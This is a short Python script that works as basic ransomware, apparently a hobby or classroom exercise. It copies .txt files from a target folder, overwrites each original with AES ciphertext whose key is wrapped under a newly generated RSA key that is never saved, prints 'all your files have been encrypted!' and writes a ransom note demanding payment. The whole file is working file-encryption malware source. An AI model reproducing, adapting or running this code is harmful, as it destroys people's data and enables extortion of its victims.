import rsa
import os
import shutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

pk,pvk=rsa.newkeys(512)
source_directory = '/Users/hsingh/Desktop/target_directory'
destination_directory = '/Users/hsingh/Desktop/pretty/copy/'


if not os.path.exists(destination_directory):
    os.makedirs(destination_directory)


files_to_encrypt=[]

for file in os.listdir(source_directory):
    if file.endswith('.txt'):
        print(file)
        files_to_encrypt.append(file)
        source_path = os.path.join(source_directory, file)
        destination_path = os.path.join(destination_directory, file)
        try:
            shutil.copy(source_path, destination_path)
        except IsADirectoryError:
            pass
#print(files_to_encrypt)
print("all your files have been encrypted!")

for file in files_to_encrypt:

    source_path = os.path.join(source_directory, file)  
    sym_key = get_random_bytes(16)
    with open(source_path, 'rb') as afile:
        content = afile.read()
        cipher = AES.new(sym_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(content)
    encr_sym_key = rsa.encrypt(sym_key, pk)
    encrypted_data = encr_sym_key + cipher.nonce + tag + ciphertext
    with open(source_path, 'wb') as aafile:
        aafile.write(encrypted_data)


with open("/Users/hsingh/Desktop/target_directory/ransom.txt",'w') as r:
    r.write("pay me $100000000 to get your files back teehee see ya")


